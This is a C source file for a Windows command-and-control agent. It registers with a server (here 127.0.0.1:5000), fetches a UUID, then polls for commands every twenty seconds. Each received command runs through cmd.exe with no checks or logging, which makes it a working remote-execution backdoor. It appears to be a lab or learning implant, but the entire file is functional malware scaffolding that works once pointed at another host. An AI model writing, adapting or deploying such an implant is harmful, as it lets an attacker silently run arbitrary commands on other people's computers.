#include <stdio.h>
#include <Windows.h>
#include <WinInet.h>

#pragma warning(disable : 4996)
#pragma comment (lib, "Wininet.lib")

BOOL SendRequest(LPCWSTR EndpointUrl, char* output) {

	HINTERNET hInternet = NULL,
		hInternetFile = NULL;
	PBYTE pBytes = NULL;
	DWORD dwBytesRead = NULL;

	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	hInternetFile = InternetOpenUrlW(hInternet, EndpointUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	pBytes = (PBYTE)LocalAlloc(LPTR, 32);

	if (!InternetReadFile(hInternetFile, pBytes, 32, &dwBytesRead)) {
		printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	pBytes[dwBytesRead] = '\0';

	memcpy(output, pBytes, dwBytesRead);

	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pBytes);

	return TRUE;
}

int main() {

	LPCWSTR Url = L"http://127.0.0.1:5000/agent/register";
	char request_output[256];
	SendRequest(Url, request_output);
	printf("My UUID: %s\n", request_output);

	wchar_t CommandUrl[256];
	swprintf(CommandUrl, 256, L"http://127.0.0.1:5000/agent/%S/command", request_output);
	wprintf(L"URL: %s\n", CommandUrl);
	char command[256];
	while (TRUE) {
		memset(command, 0, sizeof(command));
		SendRequest(CommandUrl, command);
		char no_command_set[] = "No command set";
		if (strcmp(command, no_command_set) == 0) {
			printf("Recieved no command\n");
		}
		else {
			printf("Recieved Command: %s\n", command);

			wchar_t Process_Name[256];
			swprintf(Process_Name, 256, L"/c %S", command);

			STARTUPINFOW			SiW = { 0 };
			PROCESS_INFORMATION		Pi = { 0 };

			SiW.cb = sizeof(STARTUPINFOEXA);

			if (!CreateProcessW(
				L"C:\\Windows\\System32\\cmd.exe",
				Process_Name,
				NULL,
				NULL,
				FALSE,
				0,
				NULL,
				NULL,
				&SiW,
				&Pi)) {
				printf("[!] CreateProcessW Failed with Error : %d \n", GetLastError());
			}

			else {
				printf("Process created\n");


				WaitForSingleObject(Pi.hProcess, INFINITE);


				CloseHandle(Pi.hProcess);
				CloseHandle(Pi.hThread);
			}
		}
		Sleep(20 * 1000);
	}
	return 0;
}
